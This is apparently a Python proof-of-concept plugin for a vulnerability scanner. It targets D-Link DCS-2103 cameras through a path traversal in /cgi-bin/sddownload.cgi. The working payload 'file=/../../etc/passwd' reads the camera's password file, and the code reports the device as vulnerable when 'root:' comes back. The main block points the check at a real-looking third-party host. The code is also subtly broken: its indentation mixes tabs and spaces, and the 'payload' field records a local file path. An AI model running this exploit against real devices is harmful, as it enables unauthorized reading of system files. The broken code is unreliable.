#!/usr/bin/env python
#-*- coding:utf-8 -*-
#__author__= 'K0thony'
#Exploit Tittle: D-Link DCS-2103 /cgi-bin/sddownload.cgi 任意文件下载漏洞
#Refer:http://www.beebeeto.com/pdb/poc-2014-0149/
import urlparse
from ..miniCurl import Curl
from ..t  import T

class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip+':'+port+'/'
        curl=Curl()
        result = {}
        result['result']=False

    	url = arg
    	payload = 'cgi-bin/sddownload.cgi?file=/../../etc/passwd'
    	verify_url = url + payload
    	code, head, res, _, _ = curl.curl2(verify_url)
    	if code == 200 and 'root:' in res:
    		output(url + 'D-Link DCS-2103 /cgi-bin/sddownload.cgi 任意文件下载漏洞',result,'hole')
    
    

        del curl
        return result


def output(url,result,label):
    info = url + '  D-Link  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='download Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/router/dlink/dlink_1e2462f6212f42736f41785d507ea5c0.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/www/www_1e2462f6212f42736f41785d507ea5c0.py
#/root/github/poccreate/codesrc/exp-1107.py